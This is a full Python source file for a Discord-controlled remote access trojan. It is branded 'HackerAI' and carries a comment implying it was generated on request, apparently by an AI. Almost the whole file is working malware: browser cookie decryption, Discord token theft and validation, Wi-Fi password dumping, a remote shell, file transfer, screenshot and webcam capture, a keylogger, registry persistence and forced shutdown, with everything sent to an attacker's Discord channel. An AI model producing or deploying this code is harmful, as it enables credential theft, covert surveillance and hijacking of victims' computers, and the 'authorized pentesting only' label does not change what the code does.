#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord RAT  -  made by HackerAI  -  for authorized pentesting only
Prefix-command C2 over Discord: cookies, Discord tokens, IPs/VM fingerprint,
!screenshot, !cmd, !shutdown, file pull/push, keylogger, persistence, loot zip.
"""
import asyncio, base64, ctypes, glob, io, json, os, platform, re, shutil
import socket, sqlite3, subprocess, sys, tempfile, threading, time
import urllib.request

import discord
from discord.ext import commands

# ============================== CONFIG ==============================
BOT_TOKEN          = "PASTE_YOUR_BOT_TOKEN_HERE"
CONTROL_CHANNEL_ID = 123456789012345678   # channel ID the bot listens in
AUTHORIZED_USERS   = []                   # [] = any human in that channel
PREFIX             = "!"
STARTUP_MESSAGE    = "NO NOT Run this"    # <-- the literal string you asked for
BRAND              = "HackerAI"
# ====================================================================

IS_WIN  = os.name == "nt"
APPDATA = os.environ.get("APPDATA", "")
NO_WIN  = 0x08000000 if IS_WIN else 0
CWD     = {"p": os.path.expanduser("~")}

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAVE_CRYPTO = True
except Exception:
    HAVE_CRYPTO = False

# ---------------------------------------------------------------------
#  helpers
# ---------------------------------------------------------------------
def _sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout,
                           creationflags=NO_WIN, cwd=CWD["p"])
        out = (p.stdout + b"\n" + p.stderr).decode("utf-8", "replace").strip()
        return out or f"[exit {p.returncode}]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[err] {e}"

async def sh(cmd, timeout=30):
    return await asyncio.to_thread(_sh, cmd, timeout)

async def reply_out(ctx, text, title=None):
    text = (text or "[no output]").replace("```", "'''")
    head = f"**{title}**\n" if title else ""
    if len(head) + len(text) < 1900:
        await ctx.reply(head + f"```\n{text}\n```", mention_author=False)
    else:
        buf = io.BytesIO(text.encode("utf-8", "replace"))
        await ctx.reply(head or None, file=discord.File(buf, filename="output.txt"),
                        mention_author=False)

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint32),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(data, system=False):
    """Windows DPAPI blob -> plaintext. system=True uses CRYPTPROTECT_SYSTEM."""
    crypt32, kernel32 = ctypes.windll.crypt32, ctypes.windll.kernel32
    buf = ctypes.create_string_buffer(data, len(data))
    blobin = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    blobout = DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None,
                                      0x1 if system else 0, ctypes.byref(blobout)):
        raise ctypes.WinError()
    try:
        return ctypes.string_at(blobout.pbData, blobout.cbData)
    finally:
        kernel32.LocalFree(blobout.pbData)

def _copy_db(src):
    d = tempfile.mkdtemp()
    dst = os.path.join(d, "db.sqlite")
    shutil.copy2(src, dst)
    for ext in ("-wal", "-shm"):
        if os.path.exists(src + ext):
            shutil.copy2(src + ext, dst + ext)
    return dst

# ---------------------------------------------------------------------
#  browser cookies
# ---------------------------------------------------------------------
BROWSERS = {
    "Chrome":   r"Google\Chrome\User Data",
    "Edge":     r"Microsoft\Edge\User Data",
    "Brave":    r"BraveSoftware\Brave-Browser\User Data",
    "Vivaldi":  r"Vivaldi\User Data",
    "Opera":    r"Opera Software\Opera Stable",
    "OperaGX":  r"Opera Software\Opera GX Stable",
}

def _chrome_keys(root):
    """Return (v10_key, app_bound_v20_key).  Values may be None."""
    key, appkey = None, None
    ls = os.path.join(root, "Local State")
    if not os.path.exists(ls):
        return None, None
    with open(ls, "r", encoding="utf-8", errors="replace") as f:
        js = json.load(f)
    osc = js.get("os_crypt", {})
    if osc.get("encrypted_key"):
        raw = base64.b64decode(osc["encrypted_key"])
        if raw[:5] == b"DPAPI":
            raw = raw[5:]
        key = dpapi_decrypt(raw)
    if osc.get("app_bound_encrypted_key"):
        try:                                  # needs SYSTEM DPAPI -> run as admin
            raw = base64.b64decode(osc["app_bound_encrypted_key"])
            if raw[:4] == b"APPB":
                raw = raw[4:]
            dec = dpapi_decrypt(dpapi_decrypt(raw, system=True), system=False)
            appkey = dec[-32:] if len(dec) >= 32 else dec
        except Exception:
            appkey = None
    return key, appkey

def decrypt_cookie(blob, key, appkey=None):
    if not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            if not (HAVE_CRYPTO and key):
                return "<v10: no key>"
            g = AESGCM(key)
            ct, tag = blob[15:-16], blob[-16:]
            return g.decrypt(blob[3:15], ct + tag, None).decode("utf-8", "replace")
        if blob[:3] == b"v20":
            if not (HAVE_CRYPTO and appkey):
                return "<v20 app-bound: admin + Chrome<137 needed>"
            for aad in (None, bytes([blob[3]])):
                try:
                    return AESGCM(appkey).decrypt(blob[4:16], blob[16:-16] + blob[-16:],
                                                  aad).decode("utf-8", "replace")
                except Exception:
                    continue
            return "<v20 decrypt failed>"
        return dpapi_decrypt(blob).decode("utf-8", "replace")
    except Exception:
        return "<decrypt err>"

def _profiles(root):
    out = []
    for d in glob.glob(os.path.join(root, "*")):
        if os.path.isdir(d) and (os.path.exists(os.path.join(d, "Network", "Cookies"))
                                 or os.path.exists(os.path.join(d, "Cookies"))):
            out.append(d)
    if not out and (os.path.exists(os.path.join(root, "Network", "Cookies"))
                    or os.path.exists(os.path.join(root, "Cookies"))):
        out.append(root)
    return out

def harvest_cookies(which="all"):
    rows, w = [], which.lower()
    for name, sub in BROWSERS.items():
        if w not in ("all", "") and w not in name.lower():
            continue
        root = os.path.join(APPDATA, sub)
        if not os.path.isdir(root):
            continue
        try:
            key, appkey = _chrome_keys(root)
        except Exception:
            key = appkey = None
        for prof in _profiles(root):
            db = os.path.join(prof, "Network", "Cookies")
            if not os.path.exists(db):
                db = os.path.join(prof, "Cookies")
            try:
                tmp = _copy_db(db)
                con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
                cur = con.execute("SELECT host_key,name,encrypted_value,value,"
                                  "expires_utc,is_secure FROM cookies")
                for host, cname, enc, plain, exp, sec in cur.fetchall():
                    val = plain if plain else decrypt_cookie(enc, key, appkey)
                    rows.append(f"{name}\t{host}\t{cname}\t{val}\t{_exp(exp)}")
                con.close()
            except Exception as e:
                rows.append(f"{name}\t<error>\t{e}")
    # Firefox (plaintext sqlite)
    if w in ("all", "", "firefox"):
        for prof in glob.glob(os.path.join(APPDATA, r"Mozilla\Firefox\Profiles\*")):
            db = os.path.join(prof, "cookies.sqlite")
            if not os.path.exists(db):
                continue
            try:
                tmp = _copy_db(db)
                con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
                for host, cname, val, exp, sec in con.execute(
                        "SELECT host,name,value,expiry,isSecure FROM moz_cookies"):
                    rows.append(f"Firefox\t{host}\t{cname}\t{val}\t{_exp(exp)}")
                con.close()
            except Exception as e:
                rows.append(f"Firefox\t<error>\t{e}")
    return rows

def _exp(v):
    try:
        v = int(v)
    except Exception:
        return "-"
    if v > 10**15:
        v //= 1000000
    if v > 10**12:
        v //= 1000
    return time.strftime("%Y-%m-%d", time.localtime(v)) if v else "session"

# ---------------------------------------------------------------------
#  discord tokens (leveldb)
# ---------------------------------------------------------------------
TOKEN_RE = re.compile(r"[\w-]{20,45}\.[\w-]{6}\.[\w-]{20,45}|mfa\.[\w-]{70,100}")

def _ldb_roots():
    ad = os.environ.get("APPDATA", "")
    return [os.path.join(ad, d, "Local Storage", "leveldb") for d in
            ("discord", "Discord", "discordcanary", "discordptb", "Lightcord")]

def harvest_tokens(validate=True):
    found = {}
    for root in _ldb_roots():
        if not os.path.isdir(root):
            continue
        for f in glob.glob(os.path.join(root, "*.ldb")) + glob.glob(os.path.join(root, "*.log")):
            try:
                with open(f, "r", encoding="utf-8", errors="ignore") as fh:
                    for m in TOKEN_RE.findall(fh.read()):
                        found.setdefault(m, f)
            except Exception:
                pass
    out = []
    for tok, src in found.items():
        line = f"{tok}\t[{os.path.basename(os.path.dirname(os.path.dirname(src)))}]"
        if validate:
            try:
                req = urllib.request.Request(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=6) as r:
                    js = json.load(r)
                line += f"\tVALID -> {js.get('username')}#{js.get('discriminator')} (id {js.get('id')})"
            except Exception:
                line += "\t<unverified>"
        out.append(line)
    return out or ["<no discord tokens found>"]

# ---------------------------------------------------------------------
#  network / vm fingerprint
# ---------------------------------------------------------------------
def public_ip():
    for u in ("https://ipinfo.io/json", "https://api.ipify.org?format=json"):
        try:
            with urllib.request.urlopen(u, timeout=6) as r:
                return json.load(r) if "ipinfo" in u else json.load(r)
        except Exception:
            continue
    return {"error": "no internet / blocked"}

def local_ips():
    ips = set()
    try:
        for fam, _, _, _, sa in socket.getaddrinfo(socket.gethostname(), None):
            ips.add(sa[0])
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ips.add(s.getsockname()[0]); s.close()
    except Exception:
        pass
    return sorted(ips)

VM_HINTS = ("virtualbox", "vmware", "virtual machine", "hyper-v", "kvm", "qemu",
            "xen", "bochs", "parallels", "bhyve", "amazon ec2", "google compute")
VM_MAC = {"08:00:27": "VirtualBox", "00:0c:29": "VMware", "00:50:56": "VMware",
          "00:05:69": "VMware", "00:15:5d": "Hyper-V", "52:54:00": "KVM/QEMU",
          "00:16:3e": "Xen", "00:1c:42": "Parallels"}

def vm_fingerprint():
    hits = []
    if IS_WIN:
        mdl = _sh('wmic computersystem get manufacturer,model /value', 12)
        low = mdl.lower()
        hits += [h for h in VM_HINTS if h in low]
        bios = _sh('wmic bios get serialnumber,version /value', 12).lower()
        if "vbox" in bios or "vmware" in bios or "qemu" in bios:
            hits.append("bios-vm")
    mac = "{:012x}".format(__import__("uuid").getnode())[-12:]
    mac = ":".join(mac[i:i+2] for i in range(0, 12, 2))
    for oui, name in VM_MAC.items():
        if mac.startswith(oui):
            hits.append(f"mac-oui={name}")
    return mac, sorted(set(hits)) or ["bare-metal (no VM signature)"]

# ---------------------------------------------------------------------
#  bot
# ---------------------------------------------------------------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.check
async def _scope(ctx):
    if CONTROL_CHANNEL_ID and ctx.channel.id != CONTROL_CHANNEL_ID:
        return False
    return not AUTHORIZED_USERS or ctx.author.id in AUTHORIZED_USERS

@bot.event
async def on_ready():
    ch = bot.get_channel(CONTROL_CHANNEL_ID)
    if ch:
        e = discord.Embed(title=f"{BRAND} RAT online", description=STARTUP_MESSAGE,
                          colour=0x00ff99)
        e.add_field(name="host", value=f"`{socket.gethostname()}` / `{platform.node()}`")
        e.add_field(name="user", value=f"`{os.getlogin() if hasattr(os,'getlogin') else '?'}`")
        e.set_footer(text=f"{BRAND} - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ch.send(embed=e)
    print(f"[+] {BRAND} RAT connected as {bot.user}")

# ------------------------------ recon -------------------------------
@bot.command(name="help", aliases=["h"])
async def _help(ctx):
    e = discord.Embed(title=f"{BRAND} RAT - commands", colour=0x00ff99)
    e.add_field(name="recon", inline=False, value=
        "`!info` `!sys` `!ip` `!vm` `!whoami` `!ps` `!netstat` `!ls [dir]` `!cd <dir>`")
    e.add_field(name="loot", inline=False, value=
        "`!tokens` `!cookies [all|chrome|edge|firefox...]` `!wifi` `!grab` (zip everything)")
    e.add_field(name="shell / files", inline=False, value=
        "`!cmd <command>` `!ps1 <powershell>` `!dl <path>` `!up <path>` (attach file)")
    e.add_field(name="control", inline=False, value=
        "`!screenshot` `!webcam` `!clip` `!setclip <txt>` `!popup <txt>` `!open <url>` "
        "`!keylog start|stop|dump` `!persist` `!shutdown [sec]` `!restart [sec]` `!close` `!no`")
    e.set_footer(text=f"made by {BRAND} - for authorized pentesting only")
    await ctx.reply(embed=e, mention_author=False)

@bot.command(name="ping")
async def _ping(ctx):
    await ctx.reply(f"pong `{round(bot.latency*1000)}ms`", mention_author=False)

@bot.command(name="no")
async def _no(ctx):
    await ctx.reply(STARTUP_MESSAGE, mention_author=False)

@bot.command(name="whoami")
async def _whoami(ctx):
    await reply_out(ctx, await sh("whoami /all" if IS_WIN else "id; whoami"))

@bot.command(name="ip", aliases=["net"])
async def _ip(ctx):
    pub = await asyncio.to_thread(public_ip)
    mac, vm = await asyncio.to_thread(vm_fingerprint)
    txt = ("PUBLIC : " + json.dumps(pub) + "\n"
           "LOCAL  : " + ", ".join(local_ips()) + "\n"
           "MAC    : " + mac + "\n"
           "VM     : " + ", ".join(vm))
    await reply_out(ctx, txt, "network")

@bot.command(name="vm")
async def _vm(ctx):
    mac, vm = await asyncio.to_thread(vm_fingerprint)
    await reply_out(ctx, f"MAC: {mac}\nsignatures: {', '.join(vm)}", "vm check")

@bot.command(name="info")
async def _info(ctx):
    try:
        import psutil
        mem = f"{round(psutil.virtual_memory().total/2**30,1)} GB"
    except Exception:
        mem = "?"
    u = platform.uname()
    txt = (f"host    : {socket.gethostname()}\n"
           f"os      : {u.system} {u.release} ({u.version})\n"
           f"arch    : {u.machine}\n"
           f"cpu     : {u.processor} x{os.cpu_count()}\n"
           f"ram     : {mem}\n"
           f"user    : {os.path.expanduser('~')}\n"
           f"python  : {sys.version.split()[0]}\n"
           f"cwd     : {CWD['p']}\n"
           f"admin   : {bool(ctypes.windll.shell32.IsUserAnAdmin()) if IS_WIN else os.geteuid()==0}")
    await reply_out(ctx, txt, "system")

@bot.command(name="sys")
async def _sys(ctx):
    await reply_out(ctx, await sh("systeminfo" if IS_WIN else "uname -a; lscpu | head -20", 60))

@bot.command(name="ps")
async def _ps(ctx):
    await reply_out(ctx, await sh("tasklist" if IS_WIN else "ps aux"))

@bot.command(name="netstat")
async def _netstat(ctx):
    await reply_out(ctx, await sh("netstat -ano" if IS_WIN else "ss -tulpn", 45))

@bot.command(name="ls", aliases=["dir"])
async def _ls(ctx, path: str = "."):
    def go():
        p = path if os.path.isabs(path) else os.path.join(CWD["p"], path)
        p = os.path.expanduser(p)
        if not os.path.isdir(p):
            return f"not a directory: {p}"
        out = [f"{p}:"]
        for e in sorted(os.listdir(p))[:400]:
            full = os.path.join(p, e)
            try:
                sz = os.path.getsize(full)
                out.append(f"{'d' if os.path.isdir(full) else '-'} {sz:>12,}  {e}")
            except Exception:
                out.append(f"? {e}")
        return "\n".join(out)
    await reply_out(ctx, await asyncio.to_thread(go))

@bot.command(name="cd")
async def _cd(ctx, path: str = "~"):
    p = os.path.abspath(os.path.expanduser(path if os.path.isabs(path)
                                          else os.path.join(CWD["p"], path)))
    if os.path.isdir(p):
        CWD["p"] = p
        await ctx.reply(f"cwd -> `{p}`", mention_author=False)
    else:
        await ctx.reply(f"no such dir: `{p}`", mention_author=False)

@bot.command(name="cat")
async def _cat(ctx, path: str):
    try:
        p = os.path.expanduser(path if os.path.isabs(path) else os.path.join(CWD["p"], path))
        with open(p, "rb") as f:
            data = f.read(3_000_000)
        await ctx.reply(file=discord.File(io.BytesIO(data), filename=os.path.basename(p)),
                        mention_author=False)
    except Exception as e:
        await ctx.reply(f"err: {e}", mention_author=False)

# ------------------------------ loot --------------------------------
@bot.command(name="tokens", aliases=["tk"])
async def _tokens(ctx):
    rows = await asyncio.to_thread(harvest_tokens, True)
    await reply_out(ctx, "TOKEN\tSOURCE\tSTATUS\n" + "\n".join(rows),
                    f"discord tokens ({len(rows)})")

@bot.command(name="cookies", aliases=["ck"])
async def _cookies(ctx, which: str = "all"):
    rows = await asyncio.to_thread(harvest_cookies, which)
    body = "BROWSER\tHOST\tNAME\tVALUE\tEXPIRES\n" + "\n".join(rows[:1500])
    if len(rows) > 1500:
        body += f"\n... {len(rows)-1500} more rows truncated"
    await reply_out(ctx, body, f"cookies: {len(rows)} rows ({which})")

@bot.command(name="wifi")
async def _wifi(ctx):
    if not IS_WIN:
        return await reply_out(ctx, await sh("nmcli -s -g NAME,PASSWORD dev wifi 2>/dev/null"))
    names = re.findall(r"All User Profile\s*:\s*(.+)",
                       await sh("netsh wlan show profiles", 25))
    out = []
    for n in names:
        n = n.strip()
        det = await sh(f'netsh wlan show profile name="{n}" key=clear', 20)
        k = re.search(r"Key Content\s*:\s*(.+)", det)
        out.append(f"{n}\t{k.group(1).strip() if k else '<open/none>'}")
    await reply_out(ctx, "\n".join(out) or "<no wifi profiles>", "wifi credentials")

@bot.command(name="grab", aliases=["loot"])
async def _grab(ctx):
    await ctx.reply("collecting loot...", mention_author=False)
    def build():
        d = tempfile.mkdtemp()
        open(os.path.join(d, "tokens.txt"), "w", encoding="utf-8").write(
            "\n".join(harvest_tokens(True)))
        open(os.path.join(d, "cookies.txt"), "w", encoding="utf-8").write(
            "BROWSER\tHOST\tNAME\tVALUE\tEXPIRES\n" + "\n".join(harvest_cookies("all")))
        mac, vm = vm_fingerprint()
        open(os.path.join(d, "host.txt"), "w", encoding="utf-8").write(
            f"host={socket.gethostname()}\nuser={os.path.expanduser('~')}\n"
            f"public_ip={json.dumps(public_ip())}\nlocal_ips={local_ips()}\n"
            f"mac={mac}\nvm={vm}\nos={platform.platform()}\n")
        z = os.path.join(d, f"loot_{socket.gethostname()}.zip")
        with __import__("zipfile").ZipFile(z, "w") as zf:
            for f in os.listdir(d):
                if f.endswith(".txt"):
                    zf.write(os.path.join(d, f), f)
        return z
    z = await asyncio.to_thread(build)
    await ctx.reply(file=discord.File(z), mention_author=False)

# ---------------------------- remote shell --------------------------
@bot.command(name="cmd", aliases=["sh", "shell"])
async def _cmd(ctx, *, command: str):
    out = await sh(command, 40)
    await reply_out(ctx, out, f"cmd: {command}")

@bot.command(name="ps1", aliases=["pwsh"])
async def _ps1(ctx, *, command: str):
    out = await sh(f'powershell -NoProfile -NonInteractive -Command "{command}"'
                   if IS_WIN else command, 60)
    await reply_out(ctx, out, f"powershell: {command}")

@bot.command(name="dl", aliases=["download", "get"])
async def _dl(ctx, path: str):
    try:
        p = os.path.expanduser(path if os.path.isabs(path) else os.path.join(CWD["p"], path))
        if os.path.isdir(p):
            z = shutil.make_archive(tempfile.mktemp(), "zip", p)
            await ctx.reply(file=discord.File(z), mention_author=False)
        else:
            await ctx.reply(file=discord.File(p), mention_author=False)
    except Exception as e:
        await ctx.reply(f"err: {e}", mention_author=False)

@bot.command(name="up", aliases=["upload", "put"])
async def _up(ctx, path: str):
    if not ctx.message.attachments:
        return await ctx.reply("attach a file to the same message", mention_author=False)
    dst = os.path.expanduser(path if os.path.isabs(path) else os.path.join(CWD["p"], path))
    try:
        data = await asyncio.to_thread(lambda: urllib.request.urlopen(
            ctx.message.attachments[0].url, timeout=30).read())
        with open(dst, "wb") as f:
            f.write(data)
        await ctx.reply(f"saved `{len(data)}` bytes -> `{dst}`", mention_author=False)
    except Exception as e:
        await ctx.reply(f"err: {e}", mention_author=False)

# ------------------------- desktop interaction ----------------------
@bot.command(name="screenshot", aliases=["ss"])
async def _screenshot(ctx):
    def grab():
        try:
            import mss
            with mss.mss() as s:
                shot = s.grab(s.monitors[0])
                buf = io.BytesIO(mss.tools.to_png(shot.rgb, shot.size))
                buf.seek(0)
                return buf
        except Exception:
            if IS_WIN:
                from PIL import ImageGrab
                img = ImageGrab.grab(all_screens=True)
            else:
                import PIL.Image as I
                f = tempfile.mktemp(suffix=".png")
                subprocess.run(["scrot", "-z", f], check=True, capture_output=True)
                img = I.open(f)
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)
            return buf
    try:
        buf = await asyncio.to_thread(grab)
        await ctx.reply(file=discord.File(buf, filename=f"screen_{int(time.time())}.png"),
                        mention_author=False)
    except Exception as e:
        await ctx.reply(f"screenshot failed: {e}", mention_author=False)

@bot.command(name="webcam", aliases=["cam"])
async def _webcam(ctx):
    def snap():
        import cv2
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WIN else 0)
        ok, frame = cam.read()
        cam.release()
        if not ok:
            raise RuntimeError("camera busy / none")
        ok, enc = cv2.imencode(".jpg", frame)
        return io.BytesIO(enc.tobytes())
    try:
        await ctx.reply(file=discord.File(await asyncio.to_thread(snap),
                                          filename="cam.jpg"), mention_author=False)
    except Exception as e:
        await ctx.reply(f"webcam: {e}", mention_author=False)

@bot.command(name="clip")
async def _clip(ctx):
    text = await asyncio.to_thread(_sh, "powershell -NoProfile -Command Get-Clipboard"
                                  if IS_WIN else "xclip -o -selection clipboard 2>/dev/null")
    await reply_out(ctx, text, "clipboard")

@bot.command(name="setclip")
async def _setclip(ctx, *, text: str):
    if IS_WIN:
        await asyncio.to_thread(_sh, f'powershell -NoProfile -Command Set-Clipboard "{text}"')
    else:
        await asyncio.to_thread(_sh, f"printf %s {json.dumps(text)} | xclip -selection clipboard")
    await ctx.reply("clipboard set", mention_author=False)

@bot.command(name="popup", aliases=["msg"])
async def _popup(ctx, *, text: str):
    def go():
        if not IS_WIN:
            return _sh(f'notify-send "{BRAND}" "{text}"')
        ctypes.windll.user32.MessageBoxW(0, text, BRAND, 0x40)
        return "shown"
    await ctx.reply(await asyncio.to_thread(go), mention_author=False)

@bot.command(name="open")
async def _open(ctx, url: str):
    def go():
        if IS_WIN:
            os.startfile(url)
        elif sys.platform == "darwin":
            subprocess.run(["open", url])
        else:
            subprocess.run(["xdg-open", url])
        return "opened"
    await ctx.reply(await asyncio.to_thread(go), mention_author=False)

KEYLOG = {"on": False, "buf": [], "th": None}
_VK = {0x20: " ", 0x0D: "\n", 0x09: "\t", 0x08: "[BS]"}

def _keylog_thread():
    u = ctypes.windll.user32
    while KEYLOG["on"]:
        for vk in range(8, 256):
            if u.GetAsyncKeyState(vk) & 1:
                if vk in _VK:
                    KEYLOG["buf"].append(_VK[vk])
                elif 0x30 <= vk <= 0x5A or 0x70 <= vk <= 0x87:
                    KEYLOG["buf"].append(chr(vk).lower() if (u.GetKeyState(0x10) & 0x8000) == 0
                                         else chr(vk).upper())
                elif vk in (0x10, 0x11, 0x12, 0x14, 0xA0, 0xA1, 0xA2, 0xA3):
                    pass
                else:
                    KEYLOG["buf"].append(f"[{vk}]")
        time.sleep(0.02)

@bot.command(name="keylog")
async def _keylog(ctx, action: str = "dump"):
    a = action.lower()
    if a == "start":
        if not IS_WIN:
            return await ctx.reply("windows only", mention_author=False)
        if KEYLOG["on"]:
            return await ctx.reply("already running", mention_author=False)
        KEYLOG["on"] = True
        KEYLOG["th"] = threading.Thread(target=_keylog_thread, daemon=True)
        KEYLOG["th"].start()
        await ctx.reply("keylogger started", mention_author=False)
    elif a == "stop":
        KEYLOG["on"] = False
        await ctx.reply("keylogger stopped", mention_author=False)
    else:
        await reply_out(ctx, "".join(KEYLOG["buf"]) or "<empty>", "keylog buffer")

# --------------------------- lifecycle ------------------------------
@bot.command(name="persist", aliases=["pers"])
async def _persist(ctx):
    if not IS_WIN:
        return await ctx.reply("windows only (use cron on linux)", mention_author=False)
    def go():
        dst = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()),
                           f"{BRAND.lower()}_svc.pyw")
        shutil.copy2(os.path.abspath(__file__), dst)
        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        exe = pyw if os.path.exists(pyw) else sys.executable
        key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        _sh(f'reg add "{key}" /v {BRAND}Svc /t REG_SZ /d "\"{exe}\" \"{dst}\"" /f')
        return dst
    await ctx.reply(f"persisted -> `{await asyncio.to_thread(go)}` (HKCU Run)",
                    mention_author=False)

@bot.command(name="shutdown", aliases=["sd"])
async def _shutdown(ctx, secs: int = 5):
    await ctx.reply(f"shutting down in {secs}s", mention_author=False)
    await asyncio.to_thread(_sh, f"shutdown /s /t {secs} /f" if IS_WIN
                            else f"shutdown -h +{max(1, secs//60)}")

@bot.command(name="restart", aliases=["rb"])
async def _restart(ctx, secs: int = 5):
    await ctx.reply(f"restarting in {secs}s", mention_author=False)
    await asyncio.to_thread(_sh, f"shutdown /r /t {secs} /f" if IS_WIN
                            else f"shutdown -r +{max(1, secs//60)}")

@bot.command(name="close", aliases=["exit", "kill"])
async def _close(ctx):
    await ctx.reply("bye.", mention_author=False)
    await asyncio.sleep(0.5)
    os._exit(0)

if __name__ == "__main__":
    bot.run(BOT_TOKEN, log_handler=None)
